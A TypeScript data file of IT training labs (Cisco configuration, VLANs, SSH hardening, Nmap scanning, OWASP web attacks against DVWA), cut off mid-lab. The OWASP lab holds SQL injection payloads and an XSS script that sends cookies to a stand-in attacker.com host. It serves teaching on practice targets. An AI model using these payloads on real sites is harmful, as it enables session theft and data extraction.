// ──────────────────────────────────────────────────────────────
// PiBridge Academy — Expanded Labs (Cisco-like Industry Best Practices)
// Each lab follows: Topology → Addressing Table → Objectives →
// Step-by-Step Tasks → Verification → Troubleshooting
// ──────────────────────────────────────────────────────────────

import type { LabEnvironment } from "./labData";

// ════════════════════════════════════════════════════════════════
// LAB 8: Cisco-Like Network Device Configuration
// ════════════════════════════════════════════════════════════════

export const LAB_DEVICE_CONFIG: LabEnvironment = {
  lessonId: "les-nf-1-1",
  title: "Basic Network Device Configuration (Cisco IOS Fundamentals)",
  description: "Configure a router and two switches from scratch following Cisco best practices. Set hostnames, passwords, interfaces, banners, and verify configuration with show commands.",
  objectives: [
    "Navigate Cisco IOS CLI modes (user EXEC, privileged EXEC, global config, interface config)",
    "Configure device hostname, passwords, and MOTD banner",
    "Assign IP addresses to router interfaces and verify connectivity",
    "Configure switch ports and VLAN assignments",
    "Use 'show' commands to verify configuration and troubleshoot",
    "Back up running configuration to startup configuration",
  ],
  topology: `
    [PC-1] ---- [Switch-1] ---- [Router] ---- [Switch-2] ---- [PC-2]
    10.0.1.10    Fa0/1  Fa0/24  G0/0  G0/1  Fa0/24  Fa0/1    10.0.2.10
                 VLAN 10              |            VLAN 20
                                   VLAN 30 (Management)
  `,
  addressingTable: [
    { device: "Router (R1)", interface: "GigabitEthernet0/0", ipAddress: "10.0.1.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "Gateway for VLAN 10 (Sales)" },
    { device: "Router (R1)", interface: "GigabitEthernet0/1", ipAddress: "10.0.2.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "Gateway for VLAN 20 (Engineering)" },
    { device: "Router (R1)", interface: "GigabitEthernet0/0.30", ipAddress: "10.0.30.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "Management VLAN (sub-interface)" },
    { device: "Switch-1 (SW1)", interface: "Vlan10", ipAddress: "10.0.10.2", subnetMask: "255.255.255.0", defaultGateway: "10.0.10.1", description: "SVI for VLAN 10 Management" },
    { device: "Switch-1 (SW1)", interface: "Fa0/1-10", ipAddress: "N/A", subnetMask: "N/A", defaultGateway: "N/A", description: "Access ports — VLAN 10 (Sales)" },
    { device: "Switch-1 (SW1)", interface: "Fa0/24", ipAddress: "N/A", subnetMask: "N/A", defaultGateway: "N/A", description: "Trunk to Router" },
    { device: "PC-1", interface: "NIC", ipAddress: "10.0.1.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.1.1", description: "Sales workstation" },
    { device: "PC-2", interface: "NIC", ipAddress: "10.0.2.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.2.1", description: "Engineering workstation" },
  ],
  setupInstructions: [
    "Open Cisco Packet Tracer or use the provided lab environment",
    "Place 1 Router (2911 or ISR 4331), 2 Switches (2960), and 2 PCs",
    "Connect devices according to the topology diagram above",
    "Open the CLI console on each device",
  ],
  tasks: [
    {
      order: 1,
      instruction: "Enter privileged EXEC mode and then global configuration mode on the Router.",
      commandExample: "enable\nconfigure terminal",
      competencyChecked: "CLI mode navigation",
    },
    {
      order: 2,
      instruction: "Configure the router hostname to 'R1', set the enable secret password to 'Pibridge@2026', and configure a MOTD banner.",
      commandExample: "hostname R1\nenable secret Pibridge@2026\nbanner motd # Authorized Access Only - PiBridge Academy Lab #",
      competencyChecked: "Basic device hardening",
    },
    {
      order: 3,
      instruction: "Configure GigabitEthernet0/0 with IP 10.0.1.1/24 and bring the interface up.",
      commandExample: "interface GigabitEthernet0/0\nip address 10.0.1.1 255.255.255.0\nno shutdown\nexit",
      competencyChecked: "Interface IP configuration",
    },
    {
      order: 4,
      instruction: "Configure GigabitEthernet0/1 with IP 10.0.2.1/24 and bring the interface up.",
      commandExample: "interface GigabitEthernet0/1\nip address 10.0.2.1 255.255.255.0\nno shutdown\nexit",
      competencyChecked: "Interface IP configuration",
    },
    {
      order: 5,
      instruction: "Create a sub-interface on G0/0 for VLAN 30 (management): encapsulation dot1Q 30, IP 10.0.30.1/24.",
      commandExample: "interface GigabitEthernet0/0.30\nencapsulation dot1Q 30\nip address 10.0.30.1 255.255.255.0\nexit",
      competencyChecked: "Router-on-a-Stick / sub-interfaces",
    },
    {
      order: 6,
      instruction: "Configure Switch-1: hostname SW1, enable secret, VLAN 10 named 'Sales', VLAN 20 named 'Engineering', VLAN 30 named 'Management'.",
      commandExample: "hostname SW1\nenable secret Pibridge@2026\nvlan 10\nname Sales\nvlan 20\nname Engineering\nvlan 30\nname Management\nexit",
      competencyChecked: "Switch VLAN creation",
    },
    {
      order: 7,
      instruction: "Assign SW1 ports Fa0/1 through Fa0/10 to VLAN 10 as access ports.",
      commandExample: "interface range FastEthernet0/1 - 10\nswitchport mode access\nswitchport access vlan 10\nexit",
      competencyChecked: "Access port VLAN assignment",
    },
    {
      order: 8,
      instruction: "Configure SW1 port Fa0/24 as a trunk port allowing VLANs 10, 20, 30.",
      commandExample: "interface FastEthernet0/24\nswitchport mode trunk\nswitchport trunk allowed vlan 10,20,30\nexit",
      competencyChecked: "Trunk port configuration",
    },
    {
      order: 9,
      instruction: "Configure the SVI (Switch Virtual Interface) for VLAN 10 on SW1 with IP 10.0.10.2/24 and default gateway 10.0.10.1.",
      commandExample: "interface Vlan10\nip address 10.0.10.2 255.255.255.0\nno shutdown\nexit\nip default-gateway 10.0.10.1",
      competencyChecked: "SVI and default gateway",
    },
    {
      order: 10,
      instruction: "Configure PC-1 with IP 10.0.1.10/24 and default gateway 10.0.1.1. Configure PC-2 with IP 10.0.2.10/24 and default gateway 10.0.2.1.",
      competencyChecked: "End-device IP configuration",
    },
    {
      order: 11,
      instruction: "Save all configurations on Router and Switches.",
      commandExample: "copy running-config startup-config",
      competencyChecked: "Configuration persistence",
    },
  ],
  verificationTasks: [
    {
      id: "verify-r1-interfaces",
      description: "Verify all router interfaces are UP with correct IPs",
      command: "show ip interface brief",
      expectedResult: "GigabitEthernet0/0: 10.0.1.1/24, Status: up\nGigabitEthernet0/1: 10.0.2.1/24, Status: up\nGigabitEthernet0/0.30: 10.0.30.1/24, Status: up",
      points: 10,
    },
    {
      id: "verify-sw1-vlans",
      description: "Verify VLANs exist on Switch-1",
      command: "show vlan brief",
      expectedResult: "VLAN 10 — Sales — active, ports Fa0/1-10\nVLAN 20 — Engineering — active\nVLAN 30 — Management — active",
      points: 10,
    },
    {
      id: "verify-sw1-trunk",
      description: "Verify trunk port on Fa0/24",
      command: "show interfaces trunk",
      expectedResult: "Port Fa0/24, Mode: on, Encapsulation: 802.1q, VLANs: 10,20,30",
      points: 5,
    },
    {
      id: "verify-ping-pc1-to-gateway",
      description: "PC-1 can ping its default gateway",
      command: "ping 10.0.1.1 (from PC-1)",
      expectedResult: "Success rate is 100 percent (5/5)",
      points: 10,
    },
    {
      id: "verify-ping-pc1-to-pc2",
      description: "PC-1 can ping PC-2 (inter-VLAN routing works)",
      command: "ping 10.0.2.10 (from PC-1)",
      expectedResult: "Success rate is 100 percent (5/5)",
      points: 15,
    },
    {
      id: "verify-sw1-svi",
      description: "SW1 management interface is reachable from PC-1",
      command: "ping 10.0.10.2 (from PC-1 or Router)",
      expectedResult: "Success rate is 100 percent",
      points: 5,
    },
    {
      id: "verify-config-saved",
      description: "Configuration survives a reboot (saved to NVRAM)",
      command: "show startup-config | include hostname",
      expectedResult: "hostname R1 (or SW1)",
      points: 5,
    },
  ],
  troubleshootingScenario: {
    scenario: "After completing the lab, PC-1 cannot ping PC-2. The instructor has intentionally broken 3 configurations.",
    symptoms: [
      "PC-1 can ping 10.0.1.1 (gateway) but cannot ping 10.0.2.10",
      "PC-2 can ping 10.0.2.1 (gateway) but cannot ping 10.0.1.10",
      "show ip route on R1 shows only connected routes, no routing between subnets",
    ],
    brokenConfigs: [
      "Router G0/1 has 'shutdown' (interface is down)",
      "Switch-1 Fa0/24 trunk is missing 'switchport trunk allowed vlan 20' (VLAN 20 traffic blocked)",
      "PC-1 default gateway is set to 10.0.1.254 instead of 10.0.1.1",
    ],
    solution: [
      "Enable G0/1: interface G0/1 → no shutdown",
      "Fix trunk: interface Fa0/24 → switchport trunk allowed vlan 10,20,30",
      "Fix PC-1 gateway: change to 10.0.1.1",
    ],
    rootCause: "Three independent misconfigurations: interface shutdown, incomplete trunk VLAN list, wrong default gateway",
  },
  hints: [
    "Use 'show running-config' to review all configurations",
    "Use 'show ip route' to verify the routing table has connected routes",
    "Remember: SVIs require 'no shutdown' just like physical interfaces",
    "Trunk ports must allow the VLANs you want to pass through",
  ],
  estimatedMinutes: 60,
  competencyLevel: "basic",
  alignsWith: "CCNA Module 2 (Switching), CCNA Module 3 (Routing)",
};

// ════════════════════════════════════════════════════════════════
// LAB 9: VLAN Segmentation & Inter-VLAN Routing
// ════════════════════════════════════════════════════════════════

export const LAB_VLAN_ROUTING: LabEnvironment = {
  lessonId: "les-nf-4-1",
  title: "VLAN Segmentation & Inter-VLAN Routing (Router-on-a-Stick)",
  description: "Build a multi-VLAN network with 4 departments and implement inter-VLAN routing using Router-on-a-Stick. Apply ACLs to control traffic between departments.",
  objectives: [
    "Create and name 4 VLANs for different departments",
    "Assign access ports to VLANs on multiple switches",
    "Configure 802.1Q trunking between switches and to the router",
    "Implement Router-on-a-Stick for inter-VLAN routing",
    "Apply standard and extended ACLs to filter inter-department traffic",
    "Verify connectivity and security with ping tests and show commands",
  ],
  topology: `
    [PC-Sales]      [PC-HR]       [PC-Finance]     [PC-IT]
    VLAN 10         VLAN 20       VLAN 30          VLAN 40
    10.0.10.10      10.0.20.10    10.0.30.10       10.0.40.10
        |               |             |                |
    [SW1-Floor1]    [SW1-Floor1]  [SW2-Floor2]    [SW2-Floor2]
        Fa0/1-5         Fa0/6-10     Fa0/1-5          Fa0/6-10
            \            /              \              /
             Fa0/24(trunk)           Fa0/24(trunk)
                 |                       |
            [SW-Core] ──── Fa0/24(trunk) ────
                 |
            G0/0 (sub-interfaces)
            [Router-R1]
  `,
  addressingTable: [
    { device: "Router R1", interface: "G0/0.10", ipAddress: "10.0.10.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "VLAN 10 — Sales Gateway" },
    { device: "Router R1", interface: "G0/0.20", ipAddress: "10.0.20.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "VLAN 20 — HR Gateway" },
    { device: "Router R1", interface: "G0/0.30", ipAddress: "10.0.30.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "VLAN 30 — Finance Gateway" },
    { device: "Router R1", interface: "G0/0.40", ipAddress: "10.0.40.1", subnetMask: "255.255.255.0", defaultGateway: "N/A", description: "VLAN 40 — IT Gateway" },
    { device: "PC-Sales", interface: "NIC", ipAddress: "10.0.10.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.10.1", description: "Sales workstation" },
    { device: "PC-HR", interface: "NIC", ipAddress: "10.0.20.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.20.1", description: "HR workstation" },
    { device: "PC-Finance", interface: "NIC", ipAddress: "10.0.30.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.30.1", description: "Finance workstation" },
    { device: "PC-IT", interface: "NIC", ipAddress: "10.0.40.10", subnetMask: "255.255.255.0", defaultGateway: "10.0.40.1", description: "IT workstation" },
  ],
  setupInstructions: [
    "Open Cisco Packet Tracer",
    "Place 1 Router (2911), 2 Access Switches (2960), 1 Core Switch (3560), and 4 PCs",
    "Cable according to the topology diagram",
  ],
  tasks: [
    {
      order: 1,
      instruction: "On all switches: create VLANs 10 (Sales), 20 (HR), 30 (Finance), 40 (IT) with descriptive names.",
      commandExample: "vlan 10\nname Sales\nvlan 20\nname HR\nvlan 30\nname Finance\nvlan 40\nname IT",
      competencyChecked: "VLAN creation and naming",
    },
    {
      order: 2,
      instruction: "On SW1-Floor1: assign Fa0/1-5 to VLAN 10, Fa0/6-10 to VLAN 20. Configure Fa0/24 as trunk.",
      commandExample: "interface range Fa0/1-5\nswitchport access vlan 10\ninterface range Fa0/6-10\nswitchport access vlan 20\ninterface Fa0/24\nswitchport mode trunk\nswitchport trunk allowed vlan 10,20,30,40",
      competencyChecked: "Access and trunk port configuration",
    },
    {
      order: 3,
      instruction: "On SW2-Floor2: assign Fa0/1-5 to VLAN 30, Fa0/6-10 to VLAN 40. Configure Fa0/24 as trunk.",
      competencyChecked: "Access and trunk port configuration",
    },
    {
      order: 4,
      instruction: "On SW-Core: configure all ports facing switches and the router as trunk ports.",
      competencyChecked: "Core switch trunk configuration",
    },
    {
      order: 5,
      instruction: "On Router R1: create sub-interfaces on G0/0 for VLANs 10, 20, 30, 40 with 802.1Q encapsulation.",
      commandExample: "interface G0/0.10\nencapsulation dot1Q 10\nip address 10.0.10.1 255.255.255.0\ninterface G0/0.20\nencapsulation dot1Q 20\nip address 10.0.20.1 255.255.255.0\ninterface G0/0.30\nencapsulation dot1Q 30\nip address 10.0.30.1 255.255.255.0\ninterface G0/0.40\nencapsulation dot1Q 40\nip address 10.0.40.1 255.255.255.0",
      competencyChecked: "Router-on-a-Stick configuration",
    },
    {
      order: 6,
      instruction: "Configure all PCs with correct IP addresses and default gateways from the addressing table.",
      competencyChecked: "End-device configuration",
    },
    {
      order: 7,
      instruction: "Verify: PC-Sales can ping PC-HR, PC-Finance, and PC-IT (all inter-VLAN routing works).",
      verificationCommand: "ping 10.0.20.10, ping 10.0.30.10, ping 10.0.40.10 (from PC-Sales)",
      competencyChecked: "Inter-VLAN routing verification",
    },
    {
      order: 8,
      instruction: "Apply an extended ACL on R1: BLOCK Finance (VLAN 30) from accessing IT (VLAN 40). Allow all other traffic.",
      commandExample: "access-list 100 deny ip 10.0.30.0 0.0.0.255 10.0.40.0 0.0.0.255\naccess-list 100 permit ip any any\ninterface G0/0.40\nip access-group 100 in",
      competencyChecked: "Extended ACL implementation",
    },
    {
      order: 9,
      instruction: "Verify: PC-Finance CANNOT ping PC-IT, but all other traffic still works.",
      verificationCommand: "ping 10.0.40.10 (from PC-Finance — should fail)\nping 10.0.20.10 (from PC-Finance — should succeed)",
      competencyChecked: "ACL verification",
    },
  ],
  verificationTasks: [
    { id: "v-vlan-exist", description: "All 4 VLANs exist on all switches", command: "show vlan brief", expectedResult: "VLAN 10 Sales, VLAN 20 HR, VLAN 30 Finance, VLAN 40 IT — all active", points: 10 },
    { id: "v-trunk-allowed", description: "Trunk ports allow all 4 VLANs", command: "show interfaces trunk", expectedResult: "Allowed VLANs: 10,20,30,40 on trunk ports", points: 5 },
    { id: "v-subif-up", description: "All router sub-interfaces are up", command: "show ip interface brief", expectedResult: "G0/0.10 through G0/0.40 all show 'up'", points: 10 },
    { id: "v-ping-all-vlans", description: "All PCs can ping all other PCs (before ACL)", command: "ping (from each PC to every other PC)", expectedResult: "100% success rate for all combinations", points: 15 },
    { id: "v-acl-blocks", description: "ACL blocks Finance→IT traffic", command: "ping 10.0.40.10 (from PC-Finance)", expectedResult: "Success rate is 0 percent (0/5)", points: 10 },
    { id: "v-acl-allows", description: "ACL allows Finance→HR traffic", command: "ping 10.0.20.10 (from PC-Finance)", expectedResult: "Success rate is 100 percent (5/5)", points: 5 },
  ],
  troubleshootingScenario: {
    scenario: "After configuration, PC-Sales cannot ping PC-IT. All other inter-VLAN pings work.",
    symptoms: ["PC-Sales can ping PC-HR (VLAN 20) — success", "PC-Sales can ping PC-Finance (VLAN 30) — success", "PC-Sales CANNOT ping PC-IT (VLAN 40) — timeout"],
    brokenConfigs: [
      "Router sub-interface G0/0.40 is missing 'encapsulation dot1Q 40' — without it, the router doesn't know which VLAN the traffic belongs to",
    ],
    solution: [
      "Configure: interface G0/0.40 → encapsulation dot1Q 40",
    ],
    rootCause: "The sub-interface was assigned an IP but the 802.1Q encapsulation was not configured, so the router cannot process tagged frames for VLAN 40.",
  },
  hints: [
    "The encapsulation command MUST come before the IP address on sub-interfaces",
    "ACLs are applied in the direction of traffic flow — think about which direction you want to filter",
    "Use 'show access-lists' to see hit counters and verify the ACL is matching traffic",
  ],
  estimatedMinutes: 75,
  competencyLevel: "intermediate",
  alignsWith: "CCNA Module 5 (Routing), CCNA Module 9 (ACLs)",
};

// ════════════════════════════════════════════════════════════════
// LAB 10: SSH Hardening & Access Security
// ════════════════════════════════════════════════════════════════

export const LAB_SSH_HARDENING: LabEnvironment = {
  lessonId: "les-lf-5-1",
  title: "Linux SSH Hardening & Access Control (CIS Benchmark Practice)",
  description: "Harden SSH access on a Linux server following CIS Benchmark guidelines. Implement key-based authentication, disable root login, configure fail2ban, and audit the configuration.",
  objectives: [
    "Generate SSH key pairs and configure key-based authentication",
    "Disable password authentication and root login via SSH",
    "Change the SSH default port and configure connection limits",
    "Install and configure fail2ban for SSH brute-force protection",
    "Audit SSH configuration against CIS Benchmark requirements",
    "Verify hardening with nmap and manual testing",
  ],
  setupInstructions: [
    "Use the provided Ubuntu 22.04 VM or cloud instance",
    "You need root/sudo access",
    "Have two terminals open: one as root, one as a regular user",
    "Install nmap on your local machine for scanning",
  ],
  tasks: [
    {
      order: 1,
      instruction: "Generate an SSH key pair on your local machine (or second VM).",
      commandExample: "ssh-keygen -t ed25519 -C 'pibridge-lab@academy' -f ~/.ssh/acadmey_key",
      competencyChecked: "SSH key generation",
    },
    {
      order: 2,
      instruction: "Copy the public key to the server for your regular user account.",
      commandExample: "ssh-copy-id -i ~/.ssh/acadmey_key.pub user@server-ip",
      competencyChecked: "Key deployment",
    },
    {
      order: 3,
      instruction: "Test key-based login: ssh -i ~/.ssh/acadmey_key user@server-ip. It should work without a password.",
      competencyChecked: "Key-based authentication verification",
    },
    {
      order: 4,
      instruction: "Edit /etc/ssh/sshd_config and apply CIS Benchmark settings:",
      commandExample: "# CIS Benchmark SSH Hardening\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nAuthenticationMethods publickey\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 2\nX11Forwarding no\nAllowUsers youruser\nProtocol 2\nLoginGraceTime 60\nBanner /etc/issue.net",
      competencyChecked: "SSH configuration hardening",
    },
    {
      order: 5,
      instruction: "Restart the SSH service and verify you can still log in with your key.",
      commandExample: "sudo systemctl restart sshd",
      competencyChecked: "Service management",
    },
    {
      order: 6,
      instruction: "Test that password login is now rejected (try from a different terminal without the key).",
      competencyChecked: "Negative testing",
    },
    {
      order: 7,
      instruction: "Install and configure fail2ban to protect SSH.",
      commandExample: "sudo apt install fail2ban -y\nsudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\n# Edit jail.local:\n[sshd]\nenabled = true\nport = 22\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 3600\nfindtime = 600",
      competencyChecked: "Intrusion prevention setup",
    },
    {
      order: 8,
      instruction: "Run an nmap scan from your local machine to verify SSH configuration.",
      commandExample: "nmap -sV -sC -p 22 server-ip",
      competencyChecked: "Security scanning",
    },
    {
      order: 9,
      instruction: "Create a CIS Benchmark audit checklist and verify each item.",
      competencyChecked: "Security auditing",
    },
  ],
  verificationTasks: [
    { id: "v-key-login", description: "SSH key-based login works", command: "ssh -i key user@server", expectedResult: "Login successful without password prompt", points: 10 },
    { id: "v-no-password", description: "Password authentication is disabled", command: "ssh user@server (without key)", expectedResult: "Permission denied (publickey)", points: 10 },
    { id: "v-no-root", description: "Root login is blocked", command: "ssh root@server", expectedResult: "Permission denied", points: 10 },
    { id: "v-fail2ban", description: "fail2ban is running and protecting SSH", command: "sudo fail2ban-client status sshd", expectedResult: "Status for the jail: sshd\n|- Filter: |  |- Currently failed: 0 |  |- Total failed: X | `- Journal matches: ...", points: 10 },
    { id: "v-nmap", description: "nmap shows only SSH on the expected port", command: "nmap -sV -p 1-65535 server-ip", expectedResult: "Only port 22 (or custom port) shows ssh/open", points: 10 },
    { id: "v-audit-checklist", description: "CIS audit checklist is complete", command: "Manual review", expectedResult: "All CIS Benchmark items documented with pass/fail status", points: 10 },
  ],
  hints: [
    "Always test key-based login BEFORE disabling password authentication",
    "Use 'sudo journalctl -u sshd -f' to watch SSH logs in real-time",
    "The CIS Benchmark PDF is freely available — use it as your reference",
    "fail2ban reads log files — make sure your SSH logs go to /var/log/auth.log",
  ],
  estimatedMinutes: 45,
  competencyLevel: "intermediate",
  alignsWith: "CompTIA Security+ Objective 3.5, CIS Benchmark Ubuntu 22.04",
};

// ════════════════════════════════════════════════════════════════
// LAB 11: Nmap Security Scanning & Vulnerability Assessment
// ════════════════════════════════════════════════════════════════

export const LAB_NMAP_SCANNING: LabEnvironment = {
  lessonId: "les-cf-6-3",
  title: "Nmap Security Scanning & Vulnerability Assessment",
  description: "Perform a comprehensive security assessment using Nmap. Scan a target network, identify open ports and services, detect OS versions, and produce a vulnerability report.",
  objectives: [
    "Perform host discovery to map a network",
    "Run port scans (TCP SYN, TCP Connect, UDP) to identify open services",
    "Detect operating system and service versions",
    "Use Nmap scripting engine (NSE) for vulnerability detection",
    "Interpret scan results and prioritize findings",
    "Produce a professional vulnerability assessment report",
  ],
  setupInstructions: [
    "Use the provided lab environment with multiple VMs (target network: 192.168.1.0/24)",
    "Ensure Nmap is installed on your scanning machine",
    "You should have a Kali Linux or Ubuntu VM with root access for scanning",
    "Targets: 3 VMs running different services (web server, file server, database server)",
  ],
  tasks: [
    {
      order: 1,
      instruction: "Perform host discovery to find all live hosts on the target network.",
      commandExample: "sudo nmap -sn 192.168.1.0/24",
      competencyChecked: "Network discovery",
    },
    {
      order: 2,
      instruction: "Run a TCP SYN scan (stealth scan) on all discovered hosts to find open ports.",
      commandExample: "sudo nmap -sS -T4 -p- 192.168.1.0/24",
      competencyChecked: "Port scanning techniques",
    },
    {
      order: 3,
      instruction: "Run a service version detection scan on all open ports found.",
      commandExample: "sudo nmap -sV -sC -p [open-ports] 192.168.1.0/24",
      competencyChecked: "Service enumeration",
    },
    {
      order: 4,
      instruction: "Perform OS detection on each live host.",
      commandExample: "sudo nmap -O --osscan-guess 192.168.1.0/24",
      competencyChecked: "OS fingerprinting",
    },
    {
      order: 5,
      instruction: "Run Nmap Vulnerability scripts (NSE) against discovered web services.",
      commandExample: "sudo nmap --script vuln -p 80,443,8080 192.168.1.0/24",
      competencyChecked: "Vulnerability scanning",
    },
    {
      order: 6,
      instruction: "Run Nmap scripts to check for specific issues: SSL misconfigurations, HTTP methods, SMB vulnerabilities.",
      commandExample: "sudo nmap --script ssl-enum-ciphers -p 443 [target]\nsudo nmap --script http-methods -p 80 [target]\nsudo nmap --script smb-vuln-ms17-010 -p 445 [target]",
      competencyChecked: "Targeted vulnerability checks",
    },
    {
      order: 7,
      instruction: "Analyze all results and create a vulnerability assessment report with severity ratings.",
      competencyChecked: "Report writing and analysis",
    },
  ],
  verificationTasks: [
    { id: "v-hosts-found", description: "All 3 target hosts discovered", command: "Review nmap -sn output", expectedResult: "3 hosts listed as 'Host is up'", points: 10 },
    { id: "v-ports-found", description: "Open ports correctly identified", command: "Review port scan results", expectedResult: "Expected ports found: 22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL, 445/SMB", points: 15 },
    { id: "v-services", description: "Service versions detected", command: "Review -sV output", expectedResult: "Each open port has a service name and version", points: 10 },
    { id: "v-os-detected", description: "OS detection works on at least 2 hosts", command: "Review -O output", expectedResult: "OS guesses with confidence percentage", points: 10 },
    { id: "v-vulns-found", description: "At least 2 vulnerabilities identified by NSE", command: "Review --script vuln output", expectedResult: "VULNERABLE entries with CVE references", points: 15 },
    { id: "v-report", description: "Professional vulnerability report produced", command: "Manual review", expectedResult: "Report includes: scope, methodology, findings (with severity), recommendations", points: 10 },
  ],
  hints: [
    "Use -T4 for faster scans in a lab environment (never use -T5 in production without permission)",
    "Always get written permission before scanning — unauthorized scanning is illegal",
    "Nmap output can be saved with -oN (text), -oX (XML), or -oG (grepable) for different use cases",
    "The --script vuln category runs many checks — it may take several minutes",
  ],
  estimatedMinutes: 60,
  competencyLevel: "intermediate",
  alignsWith: "CompTIA Security+ Objective 3.1, CEH Module 3, NIST SP 800-115",
};

// ════════════════════════════════════════════════════════════════
// LAB 12: Web Application Security (OWASP Top 10)
// ════════════════════════════════════════════════════════════════

export const LAB_OWASP_WEBSEC: LabEnvironment = {
  lessonId: "les-cf-5-3",
  title: "Web Application Security — OWASP Top 10 Hands-On",
  description: "Attack and defend a vulnerable web application (DVWA or WebGoat). Exploit SQL injection, XSS, CSRF, and broken authentication, then implement fixes.",
  objectives: [
    "Exploit SQL Injection to extract unauthorized data",
    "Execute Cross-Site Scripting (XSS) attacks (reflected and stored)",
    "Demonstrate Broken Authentication vulnerabilities",
    "Exploit Insecure Direct Object References (IDOR)",
    "Implement fixes for each vulnerability",
    "Verify fixes with security testing",
  ],
  setupInstructions: [
    "Deploy DVWA (Damn Vulnerable Web Application) using Docker: docker run --rm -it -p 80:80 vulnerables/web-dvwa",
    "Or use the pre-deployed WebGoat instance in the lab environment",
    "Open the application in your browser and create an account",
    "Set the DVWA security level to 'Low' for initial testing",
  ],
  tasks: [
    {
      order: 1,
      instruction: "SQL Injection: On the SQL Injection page, enter ' OR '1'='1 in the User ID field. What happens?",
      commandExample: "Enter: ' OR '1'='1\nOr: ' UNION SELECT user, password FROM users --",
      competencyChecked: "SQL Injection exploitation",
    },
    {
      order: 2,
      instruction: "Reflected XSS: On the Reflected XSS page, enter <script>alert('XSS')</script> in the name field. What happens?",
      commandExample: "Enter: <script>alert('XSS')</script>\nAdvanced: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
      competencyChecked: "Reflected XSS exploitation",
    },
    {
      order: 3,
      instruction: "Stored XSS: Post a message on the Guestbook containing a script tag. When another user views the guestbook, the script executes.",
      commandExample: "Enter message: <script>alert('Stored XSS')</script>",
      competencyChecked: "Stored XSS exploitation",
    },
    {
      order: 4,
      instruction: "Broken Authentication: Test the login page for vulnerabilities — try brute force, session fixation, and weak password policies.",
      commandExample: "Try: admin/password, admin/123456\nCheck: Is the session ID predictable? Does it change after login?",
      competencyChecked: "Authentication testing",
    },
    {
      order: 5,
      instruction: "IDOR: On the page with user-specific data (e.g., profile), change the user ID in the URL from your ID to another user's ID.",
      commandExample: "Change: /profile?id=1 → /profile?id=2",
      competencyChecked: "IDOR exploitation",
    },
    {
      order: 6,
      instruction: "Now set DVWA security to 'Medium' and re-test. How do the defenses change?",
      competencyChecked: "Defense analysis",
    },
    {
      order: 7,
      instruction: "Set security to 'High' and test again. Document what security controls are in place at each level.",
      competencyChecked: "Security control comparison",
    },
    {
      order: 8,
      instruction: "Write fixes for the Low-level vulnerabilities (input validation, parameterized queries, output encoding, CSRF tokens).",
      competencyChecked: "Remediation knowledge",
    },
  ],
  verificationTasks: [
    { id: "v-sqli", description: "SQL Injection successfully extracts data", command: "Review browser output after injection", expectedResult: "Multiple user records displayed (not just the one queried)", points: 15 },
    { id: "v-xss-reflected", description: "Reflected XSS executes JavaScript", command: "Alert box appears in browser", expectedResult: "JavaScript alert dialog pops up", points: 10 },
    { id: "v-xss-stored", description: "Stored XSS persists and executes for other users", command: "View guestbook from a different browser/session", expectedResult: "Alert dialog appears for other users viewing the page", points: 10 },
    { id: "v-idor", description: "IDOR allows accessing other users' data", command: "Change ID in URL and observe response", expectedResult: "Another user's profile/data is displayed", points: 10 },
    { id: "v-fixes", description: "Remediation document is complete", command: "Manual review", expectedResult: "Each vulnerability has a code-level fix and explanation", points: 15 },
  ],
  hints: [
    "DVWA has hints built in — click the 'View Source' button to see the vulnerable code",
    "For SQL injection, try both boolean-based and UNION-based techniques",
    "XSS payloads need to be crafted to bypass filters at higher security levels",
    "Always document what you did and what the result was — this is your evidence",
  ],
  estimatedMinutes: 60,
  competencyLevel: "advanced",
  alignsWith: "OWASP Top 10 (2021), CompTIA PenTest+ Objective 2.1, CEH Module 14",
};

// ════════════════════════════════════════════════════════════════
// LAB 13: Docker Container Security
// ════════════════════════════════════════════════════════════════

export const LAB_DOCKER_SECURITY: LabEnvironment = {
  lessonId: "les-ct-1-3",
  title: "Docker Container Security Hardening (CIS Docker Benchmark)",
  description: "Harden a Docker deployment following CIS Docker Benchmark. Audit images, configure runtime security, implement resource limits, and scan for vulnerabilities.",
  objectives: [
    "Audit Docker images for vulnerabilities with Trivy/Snyk",
    "Write a secure Dockerfile following CIS Benchmark guidelines",
    "Implement runtime security: read-only filesystem, no-new-privileges, dropped capabilities",
    "Configure Docker daemon security settings",
    "Scan running containers for misconfigurations with Docker Bench Security",
    "Implement network segmentation between containers",
  ],
  setupInstructions: [
    "Ubuntu VM with Docker and Docker Compose installed",
    "Install Trivy: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh",
    "Install Docker Bench Security: git clone https://github.com/docker/docker-bench-security.git",
    "Have a sample vulnerable application ready (e.g., DVWA or a custom Node.js app)",
  ],
  tasks: [
    {
      order: 1,
      instruction: "Run Docker Bench Security to assess current Docker configuration against CIS Benchmark.",
      commandExample: "cd docker-bench-security && sudo ./docker-bench-security.sh",
      competencyChecked: "Security auditing",
    },
    {
      order: 2,
      instruction: "Scan the base Docker image for known vulnerabilities.",
      commandExample: "trivy image nginx:latest\ntrivy image node:18-alpine",
      competencyChecked: "Vulnerability scanning",
    },
    {
      order: 3,
      instruction: "Write a secure Dockerfile for a Node.js application following CIS guidelines:",
